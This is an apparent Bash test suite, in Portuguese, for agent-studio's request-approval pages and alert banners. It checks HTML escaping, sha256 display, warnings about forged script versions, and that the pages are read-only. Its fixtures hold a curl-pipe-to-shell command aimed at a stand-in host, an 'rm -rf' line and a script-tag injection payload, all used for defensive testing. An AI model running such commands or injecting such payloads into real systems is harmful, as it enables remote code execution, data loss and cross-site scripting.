#!/usr/bin/env bash
# Testes da tela de pedidos e dos alertas no topo das páginas do agent-studio (#208, ADR-08 §8 e §10): a página
# "ver script" de um pedido do canal de aprovação (pendente e decidido), a lista de pendentes e recentes e os alertas
# do #204 em toda página, mais o que deixa conferir o script exibido: o sha256 como o `oute approve` mostra, o aviso
# de versões diferentes do mesmo id e o de sha256 que não bate com o do decidido. O DuckDB e o SurrealDB de exemplo nascem pela ingestão de verdade (POST /v1/logs com os
# eventos `oute.canal.*`, POST /v1/metrics com a fila do collector); as páginas são conferidas pelo HTML que o
# servidor devolve. Mais a lógica direto em Python (limites, sem SurrealDB, leituras que falham, texto dos alertas,
# nenhuma rota de ação). Sem Docker; o SurrealDB é o binário fixado de tests/lib/surreal.sh.
# Uso: tests/agent-studio-proposals.test.sh   (sai != 0 se algum caso falhar)
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
. "$ROOT/tests/lib/check.sh"
. "$ROOT/tests/lib/agent-studio.sh"
trap 'studio_stop; rm -rf "$TMP"' EXIT
studio_init
. "$ROOT/tests/lib/otlp.sh"
. "$ROOT/tests/lib/surreal.sh"
trap 'studio_stop; rcv_stop; surreal_stop; rm -rf "$TMP"' EXIT
surreal_bin
surreal_start "$TMP/sdb" || { cat "$TMP/sdb/log"; die "SurrealDB não subiu"; }
PKG="$ROOT/docker/agent-studio/agent_studio"

# o script que a página mostra, como texto (o conteúdo do <pre data-script>, sem o escape do HTML)
script_of() { python3 -c 'import html, re, sys
m = re.search(r"<pre class=\"script\" data-script>(.*?)</pre>", sys.stdin.read(), re.S)
sys.stdout.write(html.unescape(m.group(1)) if m else "")'; }

# ---------------------------------------------------------------- DuckDB e SurrealDB de exemplo
# Os alertas da tela são os de agora: as horas do exemplo são relativas a NOW (a hora do fato).
#   P1 (pendente, root, claude, oute-server, há 5 min): título e script com HTML.
#   P2 (decidido, user, codex, oute-mac): executado com rc 3; o `decided` leva um corpo que não deveria existir.
#   P3 (decidido): recusado, sem rc.
#   P4: só o `decided` chegou (o `proposed` não): registro sem script.
#   P5 (pendente, há 1 min): id com HTML.
# forged.json (entra só na seção 4): outro `proposed` do P1 com script diferente e hora posterior; outro do P5 com
# hora anterior (passa a ser o exibido); e o mesmo `proposed` do P3 de novo, com outro `oute.event.id`.
# Fila do collector do oute-server: 80% há 2 min (metrics-high) e 10% há 20 s (metrics-low).
NOW="$(date +%s)"
P1=20260930-120000-reiniciar-nginx; P2=20260930-110000-listar-backups; P3=20260930-100000-apagar-tudo
P4=20260930-130000-so-decidido; P5='p <b>5</b>&x=é'
PYTHONPATH="$ROOT/tests/lib" python3 - "$TMP" "$NOW" <<'PY'
import json, sys
from otlp_json import canal_decided as decided, canal_proposed as proposed, kv, queue_metrics
tmp, NOW = sys.argv[1], int(sys.argv[2])
P1, P2, P3, P4, P5 = ("20260930-120000-reiniciar-nginx", "20260930-110000-listar-backups", "20260930-100000-apagar-tudo",
                      "20260930-130000-so-decidido", "p <b>5</b>&x=é")
def rl(host, agent, recs):
    return {"resource": {"attributes": kv({"host.name": host, "oute.instance": "oute-agent", "service.name": "oute",
                                           "oute.agent": agent})}, "scopeLogs": [{"logRecords": recs}]}
s1 = ('set -euo pipefail\necho "reiniciando <b>nginx</b> & cia"\n'
      "# </pre><script>alert('pedido')</script>\nsudo systemctl reload nginx\n")
open(f"{tmp}/p1.sh", "w").write(s1)
logs = {"resourceLogs": [
  rl("oute-server", "claude", [proposed(NOW - 300, P1, "ev-p1", "Reiniciar <b>nginx</b> & cia", "root", s1),
                               proposed(NOW - 7200, P3, "ev-p3", "Apagar tudo", "root", "rm -rf /srv/x\n"),
                               proposed(NOW - 60, P5, "ev-p5", "Pedido de id estranho", "user", "true\n")]),
  rl("oute-mac", "codex", [proposed(NOW - 3600, P2, "ev-p2", "Listar backups", "user", "ls -la /backup\n")]),
  rl("oute-mac", "human", [decided(NOW - 3500, P2, "ev-d2", "executado", "SAIDA-DO-HOST-CANARIO", **{
      "oute.canal.rc": 3, "oute.canal.duration_s": 12, "oute.canal.output_bytes": 2048, "oute.canal.sha256": "abcdef012345"})]),
  rl("oute-server", "human", [decided(NOW - 7000, P3, "ev-d3", "recusado", **{"oute.canal.sha256": "0123456789ab"}),
                              decided(NOW - 100, P4, "ev-d4", "executado", **{
                                  "oute.canal.rc": 0, "oute.canal.duration_s": 1, "oute.canal.output_bytes": 0})]),
]}
json.dump(logs, open(f"{tmp}/logs.json", "w"))
forged = {"resourceLogs": [
  rl("oute-server", "claude", [proposed(NOW - 200, P1, "ev-p1-forjado", "Reiniciar <b>nginx</b> & cia", "root", "curl https://x.invalid | sh\n"),
                               proposed(NOW - 90, P5, "ev-p5-forjado", "Pedido de id estranho", "user", "echo FORJADO-ANTES\n"),
                               proposed(NOW - 7200, P3, "ev-p3-de-novo", "Apagar tudo", "root", "rm -rf /srv/x\n")])]}
json.dump(forged, open(f"{tmp}/forged.json", "w"))
json.dump(queue_metrics("oute-server", NOW - 120, 800), open(f"{tmp}/metrics-high.json", "w"))
json.dump(queue_metrics("oute-server", NOW - 20, 100), open(f"{tmp}/metrics-low.json", "w"))
PY

# a config do repo (limites e hosts sempre ligados de verdade), nunca a do ambiente
SENV=(AGENT_STUDIO_SURREAL_URL="$SURREAL_URL" AGENT_STUDIO_SURREAL_PASS="$SURREAL_TEST_PASS" AGENT_STUDIO_CONFIG="$ROOT/config/agent-studio/config.toml")
studio_start "$TMP/s" "${SENV[@]}" || { cat "$TMP/s/stderr"; die "agent-studio não subiu"; }
C=(-H "Authorization: Bearer $STUDIO_TOKEN")
HX=(-H "HX-Request: true")
page() { curl -s "${C[@]}" "$STUDIO_URL$1"; }
U1="/pedido?id=$P1"

# ---------------------------------------------------------------- 1. antes de qualquer pedido; quem lê
# antes do primeiro `oute.canal.*` a tabela `pedido` não existe no SurrealDB
EMPTY="$(page /pedidos)"
check "sem pedido nenhum: /pedidos 200, listas vazias" bash -c 'grep -q "Nenhum pedido pendente" <<<"$1" && grep -q "Nenhum pedido decidido" <<<"$1"' _ "$EMPTY"
check "sem pedido nenhum: pedido = 404"                test "$(code "${C[@]}" "$STUDIO_URL$U1")" = 404
check "sem dado nenhum: alerta de host sem dado no topo" jqe '[.[] | select(.alerta)] | length == 1 and .[0].alerta == "host_no_data" and .[0].host == "oute-server"' <<<"$(data <<<"$EMPTY")"
check "host sem dado: o texto diz que não há registro" grep -q 'Host sem dado</strong> · oute-server:' <<<"$EMPTY"
check "ingestão: logs = 200"                           test "$(post logs "$TMP/logs.json")" = 200
check "SurrealDB de exemplo: 5 registros pedido"       test "$(surreal_q 'SELECT count() FROM pedido GROUP ALL' | jq -r '.[0].count')" = 5
check "pedidos sem login: 303 para o /login"           test "$(code "$STUDIO_URL/pedidos")$(hdr location "$STUDIO_URL/pedidos")" = "303/login?next=%2Fpedidos"
check "pedido sem login: 303, com a volta"             test "$(hdr location "$STUDIO_URL$U1")" = "/login?next=%2Fpedido%3Fid%3D$P1"
check "htmx sem login: 401 com HX-Redirect"            test "$(code "${HX[@]}" "$STUDIO_URL/pedidos")$(hdr hx-redirect "${HX[@]}" "$STUDIO_URL/pedidos")" = "401/login?next=%2Fpedidos"
check "login: sem os alertas (só para quem entrou)"    bash -c '! grep -q "id=\"alertas\"" <<<"$1"' _ "$(curl -s "$STUDIO_URL/login")"

# ---------------------------------------------------------------- 2. lista: pendentes e recentes
page /pedidos > "$TMP/list.html"
L="$(data < "$TMP/list.html" | jq -c '[.[] | select(.pedido)]')"
check "lista: pendentes do mais novo para o mais antigo, depois os decididos pela hora da decisão" \
  jqe --arg p1 "$P1" --arg p2 "$P2" --arg p3 "$P3" --arg p4 "$P4" --arg p5 "$P5" 'map(.pedido) == [$p5, $p1, $p4, $p2, $p3]' <<<"$L"
check "lista: estado de cada um"                       jqe 'map(.state) == ["pendente", "pendente", "decidido", "decidido", "decidido"]' <<<"$L"
check "lista: total de pendentes"                      grep -q 'Pendentes (2)' "$TMP/list.html"
check "lista: pendente com título, root, agente, host e idade" jqe '.[1] | .as == "root" and .agent == "claude" and .host == "oute-server" and .decision == "" and (.text | test("5 min [0-9]{2} s Reiniciar <b>nginx</b> & cia 20260930-120000-reiniciar-nginx root claude oute-server"))' <<<"$L"
check "lista: decidido com decisão, rc, duração e aprovador" jqe '.[3] | .as == "user" and .agent == "codex" and .host == "oute-mac" and .decision == "executado" and .rc == "3" and (.text | test("user codex oute-mac executado 3 12,0 s bardi@oute-server"))' <<<"$L"
check "lista: recusado sem rc"                         jqe '.[4] | .decision == "recusado" and .rc == "" and (.text | test("recusado — — bardi@oute-server"))' <<<"$L"
check "lista: pedido sem o proposed aparece pelo id"   jqe --arg p4 "$P4" '.[2] | .decision == "executado" and .rc == "0" and (.text | test($p4))' <<<"$L"
check "lista: link da página do pedido (URL estável por id)" grep -qF "<a href=\"/pedido?id=$P1\">" "$TMP/list.html"
check "lista: id escapado na página e codificado no link" bash -c '! grep -q "<b>5</b>" "$1" && ! grep -q "<b>nginx</b>" "$1" && grep -qF "href=\"/pedido?id=p%20%3Cb%3E5%3C/b%3E%26x%3D%C3%A9\"" "$1"' _ "$TMP/list.html"
check "lista: menu com os pedidos"                     grep -qE '<a class="nav-item" href="/pedidos"[^>]*>.*<span>Pedidos</span></a>' "$TMP/list.html"
check "lista: a saída do host não aparece"             bash -c '! grep -q SAIDA-DO-HOST-CANARIO "$1"' _ "$TMP/list.html"

# ---------------------------------------------------------------- 3. página do pedido ("ver script")
page "$U1" > "$TMP/p1.html"
R1="$(data < "$TMP/p1.html" | jq -c '.[] | select(has("resumo-pedido"))')"
check "pedido pendente: 200"                           test "$(code "${C[@]}" "$STUDIO_URL$U1")" = 200
check "pendente: estado, root, agente e host"          jqe --arg p1 "$P1" '.["resumo-pedido"] == $p1 and .state == "pendente" and .as == "root" and .agent == "claude" and .host == "oute-server" and .decision == "" and .rc == ""' <<<"$R1"
check "pendente: título, como roda, origem e estado por extenso" jqe --arg n "$(wc -c < "$TMP/p1.sh" | tr -d ' ')" '.text | test("Título Reiniciar <b>nginx</b> & cia Roda como root \\(sudo no host\\) Agente claude Host oute-server \\(oute-agent\\) Estado pendente Proposto em \\(GMT-3\\) 20[0-9-]+ [0-9:]+ Tamanho do script " + $n + " bytes$")' <<<"$R1"
check "pendente: sem decisão, rc, duração, saída nem aprovador" jqe '.text | test("Decisão|Código de saída|Duração|Tamanho da saída|Aprovador") | not' <<<"$R1"
check "pendente: o script do pedido, inteiro e igual"  cmp -s "$TMP/p1.sh" <(script_of < "$TMP/p1.html")
check "pendente: script e título escapados (dado não confiável)" bash -c '! grep -q "<script>alert" "$1" && ! grep -q "<b>nginx</b>" "$1" && grep -q "&lt;/pre&gt;&lt;script&gt;alert" "$1"' _ "$TMP/p1.html"
page "/pedido?id=$P2" > "$TMP/p2.html"
R2="$(data < "$TMP/p2.html" | jq -c '.[] | select(has("resumo-pedido"))')"
check "decidido: estado, decisão e rc"                 jqe '.state == "decidido" and .decision == "executado" and .rc == "3" and .as == "user" and .agent == "codex" and .host == "oute-mac"' <<<"$R2"
check "decidido: decisão, rc, duração, tamanho da saída e aprovador" jqe '.text | test("Roda como user \\(o usuário do host\\)") and test("Estado decidido") and test("Decisão executado Decidido em \\(GMT-3\\) 20[0-9-]+ [0-9:]+ Código de saída \\(rc\\) 3 Duração 12,0 s Tamanho da saída 2\\.048 bytes Aprovador bardi@oute-server sha256 do script executado abcdef012345$")' <<<"$R2"
check "decidido: o script do pedido"                   test "$(script_of < "$TMP/p2.html")" = "ls -la /backup"
check "decidido: a saída do host nunca aparece (nem se o decided trouxer corpo)" bash -c '! grep -q SAIDA-DO-HOST-CANARIO "$1"' _ "$TMP/p2.html"
R3="$(page "/pedido?id=$P3" | data | jq -c '.[] | select(has("resumo-pedido"))')"
check "recusado: decisão sem rc, duração nem saída"    jqe '.decision == "recusado" and .rc == "" and (.text | test("Decisão recusado Decidido em \\(GMT-3\\) [0-9: -]+ Código de saída \\(rc\\) — Duração — Tamanho da saída — Aprovador bardi@oute-server"))' <<<"$R3"
page "/pedido?id=$P4" > "$TMP/p4.html"
check "decidido sem o proposed: 200, com o estado e o aviso de script ausente" bash -c 'grep -q "data-state=\"decidido\"" "$1" && grep -q data-sem-script "$1" && ! grep -q "data-script" "$1"' _ "$TMP/p4.html"
P5U="/pedido?id=$(enc "$P5")"
check "pedido com id estranho abre, com o id escapado" bash -c 'grep -q "data-state=\"pendente\"" <<<"$1" && ! grep -q "<b>5</b>" <<<"$1" && grep -q "p &lt;b&gt;5&lt;/b&gt;&amp;x=é" <<<"$1"' _ "$(page "$P5U")"
check "pedido que não existe: 404"                     test "$(code "${C[@]}" "$STUDIO_URL/pedido?id=nao-existe")" = 404
check "pedido sem id: 400"                             test "$(code "${C[@]}" "$STUDIO_URL/pedido")" = 400

# ---------------------------------------------------------------- 4. conferir o script exibido: sha256 e versões
# pedidos de verdade: oute-propose escreve o arquivo, oute-emit manda os eventos (receptor falso -> agent-studio) e o
# sha256 é calculado no arquivo como o `oute approve` faz (scripts/oute)
H="$TMP/home"; BIN="$TMP/bin"; mkdir -p "$H/inbox" "$BIN"; ln -s "$ROOT/docker/oute-emit" "$BIN/oute-emit"
rcv_start "$TMP/rcv"
real() { env -u CLAUDECODE -u CODEX_THREAD_ID PATH="$BIN:$PATH" HOME="$H" OTEL_RESOURCE_ATTRIBUTES="host.name=oute-server,oute.instance=oute-agent" "$@"; }
approve_sha() { (shasum -a 256 "$1" 2>/dev/null || sha256sum "$1") | cut -c1-12; }
P6="$(real env OUTE_PROPOSE_AGENT=claude "$ROOT/docker/oute-propose" "Ver disco <b>&" --root <<<$'set -euo pipefail\ndf -h  # é só leitura\n' 2>/dev/null)"
P7="$(real "$ROOT/docker/oute-propose" "Sem agente" <<<'true' 2>/dev/null)"
SHA6="$(approve_sha "$H/outbox/$P6.sh")"; SHA7="$(approve_sha "$H/outbox/$P7.sh")"
printf '# id: %s\n# rc: 0\n# como: root\n# aprovado: %s por bardi@oute-server\n# sha256: %s\n# duracao: 2 s\n# saida: 10 bytes\n\nSAIDA\n' "$P6" "$(date -u +%FT%TZ)" "$SHA6" > "$H/inbox/$P6.out"
printf '# id: %s\n# rc: 126\n# recusado: %s por bardi@oute-server\n# sha256: %s\n\nrecusado\n' "$P7" "$(date -u +%FT%TZ)" "$SHA7" > "$H/inbox/$P7.out"
real "$BIN/oute-emit" canal "$P6"; real "$BIN/oute-emit" canal "$P7"
rcv_stop
check "oute-propose e oute-emit de verdade: 2 proposed e 2 decided capturados" test "$(events "$TMP/rcv" | jq -r .name | sort | uniq -c | tr -s ' \n' ' ')" = " 2 oute.canal.decided 2 oute.canal.proposed "
for f in "$TMP/rcv"/*.json; do post logs "$f" >/dev/null; done
check "o oute approve segue calculando o sha256 do arquivo do pedido (12 primeiros, até 64 KiB)" bash -c 'grep -q "head -c 65536 \"\$HOME/outbox/\$1.sh\"" "$1" && grep -qF "sha=\"\$( (shasum -a 256 \"\$src\" 2>/dev/null || sha256sum \"\$src\") | cut -c1-12)\"" "$1"' _ "$ROOT/scripts/oute"
shown() { data | jq -r '.[] | select(has("sha-exibido")) | .["sha-exibido"]'; }
page "/pedido?id=$P6" > "$TMP/p6.html"
check "sha256 do script exibido = o que o oute approve imprime" test "$(shown < "$TMP/p6.html")" = "$SHA6"
check "decidido com o mesmo sha256: dito na página, sem aviso" bash -c 'grep -q "<code>$2</code> (igual ao do script exibido)" "$1" && ! grep -q "data-sha-diferente\|data-versoes" "$1"' _ "$TMP/p6.html" "$SHA6"
check "pedido sem agente (desconhecido no arquivo): o sha256 também bate" test "$(page "/pedido?id=$P7" | shown)" = "$SHA7"
check "pendente: sha256 do exibido (12 hex), sem aviso" bash -c 'grep -qE "^[0-9a-f]{12}$" <<<"$2" && ! grep -q "data-sha-diferente\|data-versoes" "$1"' _ "$TMP/p1.html" "$(shown < "$TMP/p1.html")"
check "decidido com outro sha256: aviso com os dois valores" jqe --arg s "$(shown < "$TMP/p2.html")" '[.[] | select(has("sha-diferente"))] | length == 1 and (.[0].text | test("não é o que foi decidido no host: o sha256 do exibido é " + $s + " e o do oute approve foi abcdef012345")) and $s != "abcdef012345"' <<<"$(data < "$TMP/p2.html")"
check "sem o script (só o decided): sem sha256 e sem aviso" bash -c '! grep -q "data-sha-exibido\|data-sha-diferente\|data-versoes" "$1"' _ "$TMP/p4.html"
SHA1="$(shown < "$TMP/p1.html")"
check "ingestão: proposed forjados = 200"              test "$(post logs "$TMP/forged.json")" = 200
page "$U1" > "$TMP/p1-forjado.html"
check "outro proposed com o mesmo id e script diferente: aviso dizendo quantos" jqe '[.[] | select(.versoes)] | length == 1 and .[0].versoes == "2" and (.[0].text | test("^Chegaram 2 versões diferentes deste pedido"))' <<<"$(data < "$TMP/p1-forjado.html")"
check "forjado com hora posterior: o exibido e o sha256 dele não mudam" test "$(script_of < "$TMP/p1-forjado.html" | cmp -s "$TMP/p1.sh" - && shown < "$TMP/p1-forjado.html")" = "$SHA1"
page "$P5U" > "$TMP/p5-forjado.html"
check "forjado com hora anterior: passa a ser o exibido, com o aviso (a tela não decide)" test "$(script_of < "$TMP/p5-forjado.html")$(grep -c 'data-versoes="2"' "$TMP/p5-forjado.html")" = "echo FORJADO-ANTES1"
check "o mesmo proposed repetido (outro oute.event.id) não é versão nova" bash -c '! grep -q data-versoes <<<"$1" && grep -q data-script <<<"$1"' _ "$(page "/pedido?id=$P3")"

# ---------------------------------------------------------------- 5. a tela não tem ação
check "POST /pedido e /pedidos: 405 (só leitura)"      test "$(code -X POST "${C[@]}" "$STUDIO_URL$U1")$(code -X POST "${C[@]}" "$STUDIO_URL/pedidos")" = 405405
check "PUT e DELETE no pedido: 405"                    test "$(code -X PUT "${C[@]}" "$STUDIO_URL$U1")$(code -X DELETE "${C[@]}" "$STUDIO_URL$U1")" = 405405
check "páginas dos pedidos: o único formulário é o de sair" test "$(grep -ho '<form[^>]*>' "$TMP/list.html" "$TMP/p1.html" "$TMP/p2.html" | sort -u)" = '<form method="post" action="/logout">'
check "páginas dos pedidos: os únicos botões são o Sair (um por formulário) e o Copiar, que só copia e nasce escondido (#468)" bash -c 'for f in "$@"; do b=$(grep -o "<button" "$f" | wc -l); c=$(grep -o "<button type=\"button\" class=\"botao copiar\" aria-controls=\"[a-z-]*\" hidden>" "$f" | wc -l); f2=$(grep -o "<form" "$f" | wc -l); [ "$((b - c))" -ge 1 ] && [ "$((b - c))" = "$f2" ] && [ "$((b - c))" = "$(grep -o "<button type=\"submit\"" "$f" | wc -l)" ] && [ "$(grep -o "<button[^>]*>.*</button>" "$f" | grep -v "class=\"botao copiar\"" | grep -vc Sair)" = 0 ] || exit 1; done' _ "$TMP/list.html" "$TMP/p1.html" "$TMP/p2.html"
check "páginas dos pedidos: nenhum campo de entrada"   bash -c '! grep -hiE "<(input|select|textarea)" "$@" | grep -v "class=\"menu-interruptor\""' _ "$TMP/list.html" "$TMP/p1.html" "$TMP/p2.html"
check "templates: nenhum pedido do htmx que não seja leitura" bash -c '! grep -rqiE "hx-(post|put|patch|delete)" "$1/templates"' _ "$PKG"
check "pendente: o comando com o id só sai para id seguro (letras, números, ponto, hífen, sublinhado), escapado (#468)" bash -c 'grep -q "<code class=\"comando\" id=\"comando\">oute approve $2</code>" "$1"' _ "$TMP/p1.html" "$P1"
check "pendente com id fora do padrão: a página não monta o comando, só avisa" bash -c '! grep -q "oute approve p" <<<"$1" && ! grep -q "id=\"comando\"" <<<"$1" && grep -q "data-id-fora-do-padrao" <<<"$1"' _ "$(page "$P5U")"
# Kubo (#468): âmbar do Gate no pendente, Badges de root/user e de decisão, duas colunas, Copiar que só copia
check "lista: duas colunas (Pendentes e Decididos), tabelas em cartão que empilha no celular" bash -c 'grep -q "<div class=\"metades\">" "$1" && [ "$(grep -o "<table class=\"pedidos empilha\">" "$1" | wc -l)" = 2 ] && [ "$(grep -o "<div class=\"cartao rolagem\">" "$1" | wc -l)" = 2 ]' _ "$TMP/list.html"
check "lista: cada pendente leva o chip âmbar \"há N\" (Badge gate), e só os pendentes" bash -c '[ "$(grep -oE "class=\"badge gate\">há [0-9]+ min" "$1" | wc -l)" = 2 ] && [ "$(grep -c "badge gate" "$1")" = 2 ]' _ "$TMP/list.html"
check "lista: roda como em Badge (root destrutivo com o escudo, user secundário)" bash -c 'grep -q "class=\"badge destrutivo\"><svg[^>]*><use href=\"/static/lucide.svg#shield-alert\"/></svg>root</span>" "$1" && grep -q "class=\"badge secundario\"><svg[^>]*><use href=\"/static/lucide.svg#user\"/></svg>user</span>" "$1"' _ "$TMP/list.html"
check "lista: decisão em Badge (executado secundário, recusado de contorno) e rc ≠ 0 em Badge destrutivo" bash -c 'grep -q "badge secundario\"><svg[^>]*><use href=\"/static/lucide.svg#check\"/></svg>executado</span>" "$1" && grep -q "badge contorno\"><svg[^>]*><use href=\"/static/lucide.svg#x\"/></svg>recusado</span>" "$1" && grep -q "<td class=\"n\"><span class=\"badge destrutivo\">3</span></td>" "$1"' _ "$TMP/list.html"
check "lista: rc 0 e sem rc ficam sem Badge, e a linha não leva class erro" bash -c 'grep -q "<td class=\"n\">0</td>" "$1" && grep -q "<td class=\"n\">—</td>" "$1" && ! grep -q "class=\"erro\"" "$1"' _ "$TMP/list.html"
check "pedido pendente: chip âmbar de Gate no topo e Badge root" bash -c 'grep -qE "class=\"badge gate\"><svg[^>]*><use href=\"/static/lucide.svg#hand\"/></svg>Gate · pendente há [0-9]+ min" "$1" && grep -q "badge destrutivo\"><svg[^>]*><use href=\"/static/lucide.svg#shield-alert\"/></svg>root (sudo no host)</span>" "$1"' _ "$TMP/p1.html"
check "pedido pendente: o estado do resumo é o Badge âmbar" bash -c 'grep -q "<dt>Estado</dt><dd><span class=\"badge gate\">pendente</span></dd>" "$1"' _ "$TMP/p1.html"
check "pedido decidido: sem chip de Gate, sem âmbar e sem o comando de aprovar" bash -c '! grep -q "badge gate" "$1" && ! grep -q "id=\"comando\"" "$1" && grep -q "<h2>Decidir no host</h2>" "$1"' _ "$TMP/p2.html"
check "pedido: Copiar nasce escondido, aponta para um id que existe, e o comando leva o oute approve do id seguro" bash -c 'f="$1"; [ "$(grep -o "<button type=\"button\" class=\"botao copiar\" aria-controls=\"[a-z-]*\" hidden>" "$f" | wc -l)" = 2 ] && for id in $(grep -o "aria-controls=\"[a-z-]*\"" "$f" | cut -d\" -f2); do grep -q "id=\"$id\"" "$f" || exit 1; done && grep -q "id=\"script-corpo\"><pre class=\"script\" data-script>" "$f" && grep -q "<script src=\"/static/copiar.js\" defer>" "$f"' _ "$TMP/p1.html"
check "pedido decidido: um Copiar só (o do script)" bash -c '[ "$(grep -o "class=\"botao copiar\"" "$1" | wc -l)" = 1 ]' _ "$TMP/p2.html"
check "pedido: o script em bloco mono com o sha256 no cabeçalho" bash -c 'grep -q "<div class=\"script-topo\"><span>Script · sha256 exibido <code>[0-9a-f]\{12\}</code></span>" "$1"' _ "$TMP/p1.html"

# ---------------------------------------------------------------- 6. alertas do #204 no topo de todas as páginas
# o oute-server acabou de mandar dado (os eventos dos pedidos): nenhum alerta
alerts_of() { page "$1" | data | jq -c '[.[] | select(.alerta)]'; }
api() { curl -s "${C[@]}" "$STUDIO_URL/v1/alerts" | jq -c '[.alerts[] | {type, host, value, since}]'; }
check "sem alerta ativo: /v1/alerts vazio"             test "$(api)" = "[]"
check "sem alerta ativo: nenhum alerta na página"      bash -c 'grep -q "id=\"alertas\" data-alertas=\"0\" hidden" <<<"$1" && ! grep -q "data-alerta=" <<<"$1"' _ "$(page /pedidos)"
check "ingestão: fila a 80% = 200"                     test "$(post metrics "$TMP/metrics-high.json")" = 200
API="$(api)"
check "/v1/alerts: fila acima de 50%"                  jqe 'length == 1 and .[0].type == "queue" and .[0].host == "oute-server" and .[0].value == 0.8' <<<"$API"
for path in /conversas /sessoes /pedidos "/pedido?id=nao-existe" "/conversa?id=nao-existe" "/sessao?id=nao-existe"; do
  check "alerta visível no topo de $path, igual ao do /v1/alerts" jqe --argjson api "$API" \
    'map({type: .alerta, host, value: (.value | tonumber), since}) == $api' <<<"$(alerts_of "$path")"
done
# nos detalhes (pedido, conversa e os logs dela) as faixas somem (#467)
for path in "$U1" "/conversa/logs?id=x"; do
  check "faixa de alertas some no detalhe $path" bash -c '! grep -q "id=\"alertas\"" <<<"$1"' _ "$(page "$path")"
done
page "$U1" > "$TMP/alert-pedido.html"
page /pedidos > "$TMP/alert.html"
check "alerta: texto com host, exporter, valor e limite" jqe '.[0].text | test("^Fila do collector acima do limite · oute-server \\(oute-agent\\) · exporter otlp_http/studio_logs ?: 80% da fila \\(limite 50%\\) · desde 20[0-9-]+ [0-9:]+ GMT-3$")' <<<"$(data < "$TMP/alert.html" | jq -c '[.[] | select(.alerta)]')"
check "alerta: antes do conteúdo, fora do que o htmx troca" bash -c 'a="$(grep -n "id=\"alertas\"" "$1" | cut -d: -f1)"; m="$(grep -n "<main id=\"conteudo\">" "$1" | cut -d: -f1)"; test -n "$a" && test "$a" -lt "$m"' _ "$TMP/alert.html"
check "alerta: faixa sob o cabeçalho, com o ícone siren (#467)" bash -c 'h="$(grep -n "</header>" "$1" | head -1 | cut -d: -f1)"; a="$(grep -n "id=\"alertas\"" "$1" | cut -d: -f1)"; test -n "$h" && test "$h" -lt "$a" && sed -n "${a},$((a+2))p" "$1" | grep -q "lucide.svg#siren"' _ "$TMP/alert.html"
check "alerta: a página do pedido segue inteira"       cmp -s "$TMP/p1.sh" <(script_of < "$TMP/alert-pedido.html")
check "trecho do htmx não leva os alertas"             bash -c '! grep -q "alertas" <<<"$1"' _ "$(curl -s "${C[@]}" "${HX[@]}" "$STUDIO_URL/conversa/logs?id=x")"
check "ingestão: fila a 10% = 200"                     test "$(post metrics "$TMP/metrics-low.json")" = 200
check "alerta desliga sozinho com o dado seguinte"     test "$(api)$(alerts_of "$U1")" = "[][]"

# ---------------------------------------------------------------- 7. sem CDN, sem script inline, mesma CSP
PAGES=("$TMP/list.html" "$TMP/p1.html" "$TMP/p2.html" "$TMP/p4.html" "$TMP/alert.html" "$TMP/alert-pedido.html" "$TMP/p6.html" "$TMP/p1-forjado.html")
check "páginas: nenhum script, estilo ou link de fora" bash -c '! grep -hoiE "(src|href|action|hx-get)=\"[^\"]*\"" "$@" | grep -qE "=\"([a-z]+:)?//"' _ "${PAGES[@]}"
check "páginas: sem script nem estilo inline"          bash -c '! grep -hiE "<script(>| [^>]*>)[^<]|<style|[ \"]style=|[ \"]on[a-z]+=\"" "$@"' _ "${PAGES[@]}"
check "páginas: script só do /static (htmx; o copiar.js só na página do pedido)" test "$(grep -ho '<script[^>]*>' "${PAGES[@]}" | sort -u | paste -sd,)" = '<script src="/static/copiar.js" defer>,<script src="/static/htmx.min.js" defer>'
check "páginas: o copiar.js só aparece no pedido com script" test "$(grep -l 'copiar.js' "${PAGES[@]}" | wc -l)" -ge 1 -a "$(grep -l 'copiar.js' "$TMP/list.html" | wc -l)" = 0
CSP="$(hdr content-security-policy "${C[@]}" "$STUDIO_URL$U1")"
check "CSP: a mesma das conversas, no pedido e na lista" test "$CSP" = "$(hdr content-security-policy "${C[@]}" "$STUDIO_URL/conversas")" -a "$CSP" = "$(hdr content-security-policy "${C[@]}" "$STUDIO_URL/pedidos")"
check "CSP: script e estilo só deste servidor"         bash -c 'grep -q "default-src .none." <<<"$1" && grep -q "script-src .self.;" <<<"$1" && grep -q "style-src .self.;" <<<"$1"' _ "$CSP"
check "páginas não vão para cache"                     test "$(hdr cache-control "${C[@]}" "$STUDIO_URL$U1")" = no-store
check "até aqui, nenhuma falha no stderr"              bash -c '! grep -q "respondi 500\|falhou\|Traceback" "$1"' _ "$TMP/s/stderr"

# ---------------------------------------------------------------- 7b. título com "palavra: texto" (#337)
# o `/rpc` do SurrealDB lia a variável "ship: verificar deploy…" como record id e guardava só `ship:verificar`
T337='ship: verificar deploy v0.7.33 no oute-server'; P337=20261003-134722-ship-verificar-deploy-v0-7-33-no-oute-se
PYTHONPATH="$ROOT/tests/lib" python3 - "$TMP" "$NOW" "$P337" "$T337" <<'PY'
import json, sys
from otlp_json import canal_proposed as proposed, kv, rl
tmp, now, pid, title = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
res = {"host.name": "oute-server", "oute.instance": "oute-agent", "service.name": "oute", "oute.agent": "claude"}
ev = lambda i, t: rl(res, [proposed(now - 30, pid + i, "ev-337" + i, t, "user", "true\n")])
json.dump({"resourceLogs": [ev("", title), ev("-b", "12:30 reunião: é só texto"), ev("-c", "2026-10-03T10:00:00Z")]}, open(f"{tmp}/t337.json", "w"))
PY
check "título com dois-pontos: ingestão 200"           test "$(post logs "$TMP/t337.json")" = 200
check "título com dois-pontos: SurrealDB guarda string, inteiro" jqe --arg t "$T337" '.[0].title == $t and .[0].ty == "string"' <<<"$(surreal_q "SELECT title, type::of(title) AS ty FROM type::record('pedido', '$P337')")"
check "título com data ou hora no começo: segue string" jqe '[.[] | select(.id | test("-[bc]`?$"))] | length == 2 and all(.ty == "string") and (map(.title) | sort == ["12:30 reunião: é só texto", "2026-10-03T10:00:00Z"])' <<<"$(surreal_q "SELECT record::id(id) AS id, title, type::of(title) AS ty FROM pedido WHERE record::id(id) IN ['$P337-b', '$P337-c']")"
page "/pedido?id=$P337" > "$TMP/p337.html"
check "/pedido: título inteiro na tela e no <title>"   bash -c 'grep -qF "<dd>$2</dd>" "$1" && grep -qF "<title>$2 · agent-studio</title>" "$1"' _ "$TMP/p337.html" "$T337"
